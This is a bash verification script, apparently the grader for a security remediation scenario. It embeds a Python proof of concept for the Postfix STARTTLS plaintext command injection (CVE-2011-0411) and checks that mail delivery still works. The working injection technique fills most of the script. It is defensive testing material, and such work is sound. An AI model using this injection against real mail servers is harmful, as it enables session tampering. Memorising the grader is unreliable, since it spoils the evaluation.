#!/bin/bash
# Scenario 22: Postfix STARTTLS plaintext command injection (CVE-2011-0411)
#
# BEHAVIOURAL verifier. It does NOT grep main.cf or the Postfix version — a
# defender who edits main.cf but never runs `postfix reload` is still exposed
# (the warm smtpd keeps its cached STARTTLS-enabled config; see the Dockerfile's
# oversized max_idle, which keeps that child alive well past any harness run so
# the notrestart case cannot silently invert). Instead it drives a REAL exploit
# against the running smtpd:
#
#   1. EHLO the live server. If STARTTLS is not advertised, TLS is disabled —
#      the injection is impossible and the vuln is remediated (threat.md
#      option 2). We DO NOT stop there: a "fix" that turns TLS off but also
#      bricks mail delivery must fail, so we prove the legitimate mail path
#      still works (a real MAIL FROM / RCPT TO transaction returns 250).
#   2. If STARTTLS IS advertised, pipeline "STARTTLS\r\nNOOP\r\n" in a single
#      write (the injected NOOP arrives as plaintext BEFORE the TLS handshake),
#      complete the TLS handshake, then read from the encrypted channel WITHOUT
#      sending anything. A vulnerable Postfix (<2.5.13) executes the buffered
#      plaintext NOOP inside the TLS session and replies "250 ... Ok" over TLS —
#      proof the plaintext command was injected across the TLS boundary. A fixed
#      Postfix discards the pre-TLS buffer (nothing to read).
#
# Truth table:
#   TLS on, Postfix 2.5.1 running          -> injected NOOP replayed over TLS -> FAIL
#   TLS disabled + reload, mail still works -> no STARTTLS, MAIL/RCPT 250      -> PASS
#   TLS disabled + reload, mail bricked     -> no STARTTLS, MAIL/RCPT != 250   -> FAIL
#   smtpd_use_tls=no in main.cf, NO reload  -> warm daemon still offers TLS    -> FAIL
#   nothing done                            -> injection fires                 -> FAIL
#
# Exit 0 = remediated (PASS), Exit 1 = still vulnerable or broken (FAIL)

set -u
POC=/tmp/starttls_inject.$$.py
trap 'rm -f "$POC"' EXIT

###############################################################################
# The image CMD boots the Postfix master (see .preserve-cmd). verify.sh must
# NEVER start it — a freshly started daemon would mask the "edited main.cf but
# never reloaded" case, and a dead service is a real failure.
###############################################################################
if ! pgrep -x master >/dev/null 2>&1; then
    echo "FAIL [Regression]: Postfix master is not running — a dead service is a" >&2
    echo "                   failure (verify.sh must not start it)." >&2
    exit 1
fi

cat > "$POC" <<'PY'
import socket, time, select, sys
from OpenSSL import SSL

HOST, PORT = "127.0.0.1", 25

def tcp():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5); s.connect((HOST, PORT)); return s

def readline(sock, t=5):
    sock.settimeout(t); data = ""
    try:
        while not data.endswith("\n"):
            c = sock.recv(1)
            if not c: break
            data += c
    except Exception:
        pass
    return data

# Bounded wait for the SMTP banner (service may still be booting).
banner = ""
for _ in range(20):
    try:
        s = tcp()
        banner = readline(s)
        if banner.startswith("220"):
            break
    except Exception:
        banner = ""
    time.sleep(1)
if not banner.startswith("220"):
    print("SMTP_DOWN: no 220 banner on port 25")
    sys.exit(3)

# EHLO -> collect advertised capabilities.
s.sendall("EHLO probe\r\n")
time.sleep(0.3); s.settimeout(4); caps = ""
try:
    while True:
        d = s.recv(4096)
        if not d: break
        caps += d
        if "\n250 " in ("\n" + caps):
            break
except Exception:
    pass
if "250" not in caps:
    print("SMTP_DOWN: EHLO not answered (got %r)" % caps)
    sys.exit(3)

if "STARTTLS" not in caps.upper():
    # TLS disabled -> STARTTLS injection is impossible; the mail-path regression
    # (below, in the shell) still has to prove the service is not bricked.
    print("REMEDIATED_NOTLS: STARTTLS not advertised.")
    sys.exit(0)

# STARTTLS advertised -> attempt the plaintext injection across the TLS boundary.
s.sendall("STARTTLS\r\nNOOP\r\n")          # NOOP is injected as pre-TLS plaintext
resp = readline(s)
if not resp.startswith("220"):
    print("AMBIGUOUS: STARTTLS advertised but did not return 220 (got %r)" % resp)
    sys.exit(4)

s.setblocking(1)
ctx = SSL.Context(SSL.SSLv23_METHOD)
conn = SSL.Connection(ctx, s)
conn.set_connect_state()
deadline = time.time() + 10
while True:
    try:
        conn.do_handshake(); break
    except SSL.WantReadError:
        if time.time() > deadline:
            print("AMBIGUOUS: TLS handshake did not complete")
            sys.exit(4)
        select.select([s], [], [], 2)

# Read from the encrypted channel WITHOUT sending anything. Any reply here is a
# response to the plaintext NOOP that was buffered before the handshake.
injected = ""
end = time.time() + 4
while time.time() < end:
    r, _, _ = select.select([s], [], [], 1)
    if not r:
        continue
    try:
        chunk = conn.recv(1024)
        if not chunk: break
        injected += chunk
    except SSL.WantReadError:
        continue
    except Exception:
        break

if "250" in injected:
    print("VULNERABLE: plaintext NOOP injected before STARTTLS was executed "
          "inside the TLS session (server replied %r over TLS)." % injected.strip())
    sys.exit(1)

print("REMEDIATED_TLS_SAFE: STARTTLS offered but the pre-TLS plaintext buffer "
      "was discarded (no injected reply over TLS).")
sys.exit(0)
PY

OUT=$(python "$POC" 2>&1)
RC=$?
echo "$OUT"

case "$RC" in
    0)
        echo "PASS [PoC]: STARTTLS command injection (CVE-2011-0411) is not exploitable."
        ;;
    1)
        echo "FAIL [PoC]: Postfix STARTTLS plaintext command injection succeeded against" >&2
        echo "            the live daemon on port 25." >&2
        exit 1
        ;;
    *)
        echo "FAIL [Regression]: could not exercise the live SMTP/STARTTLS service" >&2
        echo "                   (rc=$RC). A broken/dead service is a failure." >&2
        exit 1
        ;;
esac

###############################################################################
# Regression: the LEGITIMATE mail path must still work. Drive a real envelope
# (MAIL FROM / RCPT TO to a local recipient) and require Postfix to accept it
# with 250 responses. This stops a "disable TLS and brick the service" edit
# from passing on the STARTTLS-absent branch.
###############################################################################
TX=$(printf 'EHLO probe\r\nMAIL FROM:<postmaster@localhost>\r\nRCPT TO:<root@localhost>\r\nQUIT\r\n' \
        | timeout 15 nc -w6 127.0.0.1 25 2>/dev/null)
# Postfix accepts MAIL FROM with "250 2.1.0" and RCPT TO with "250 2.1.5" (RFC
# 3463 enhanced status codes, on by default). Both must be present: a fix that
# turns TLS off but rejects recipients (bricks delivery) is missing "2.1.5".
if ! printf '%s\n' "$TX" | grep -q '250 2\.1\.0' || \
   ! printf '%s\n' "$TX" | grep -q '250 2\.1\.5'; then
    echo "FAIL [Regression]: legitimate mail transaction was not accepted" >&2
    echo "                   (MAIL FROM 250 2.1.0 and RCPT TO 250 2.1.5 required)." >&2
    echo "                   transcript: $(printf '%s' "$TX" | tr '\r\n' '  ')" >&2
    exit 1
fi
echo "PASS [Regression]: legitimate mail path works (MAIL FROM/RCPT TO accepted, 250)."

echo "All checks passed."
exit 0
